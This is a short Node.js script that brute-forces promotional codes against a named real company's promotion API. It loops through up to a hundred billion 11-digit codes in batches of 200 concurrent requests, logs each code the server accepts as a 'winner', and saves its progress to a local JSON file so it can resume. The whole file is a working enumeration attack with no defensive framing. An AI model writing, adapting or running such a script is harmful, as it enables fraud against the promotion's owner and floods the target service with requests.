const axios = require('axios');
const fs = require('fs');
const path = require('path');
const db = path.resolve('./db.json');


const MAX = 100000000000; // (10^11)
const INCREMENT_CONSTANT = 200;
const URL = 'https://www.osem.co.il/tasterschoice/api/0/codes/TC';
const generateURL = code => `${URL}${code}`;
let winners = [];


const task = async (code) =>{
	const paddedCode = code.toString().padStart(11, '0');
	const url = generateURL(paddedCode);
	try{
		await axios.get(url);
		winners.push(paddedCode);
		console.log(`Winner! - ${paddedCode}`);
	}catch({response}){
		// console.log(`${paddedCode} - ${response.status}`);
	}
};

async function run(){
	const { count } = require(db);
	
	let asyncTasks = [];
// Brute
	for(let j = count; j < MAX; j += INCREMENT_CONSTANT){
		// Generate requests
		for(let i = 0; i < INCREMENT_CONSTANT; i++){
			asyncTasks.push(task(j + i));
		}
		await Promise.all(asyncTasks);
		
		// Clear tasks
		asyncTasks = [];
		
		// Fetch winners
		const { winners: fileWinners = [] } = require(db);
		
		// Update winners
		// Update count
		const newFile = {
			count: j + INCREMENT_CONSTANT,
			winners: [].concat(fileWinners).concat(winners)
		};
		
		await fs.writeFileSync(db, JSON.stringify(newFile));
		console.log(`Dumped! count - ${j + INCREMENT_CONSTANT}`);
	}
}
run();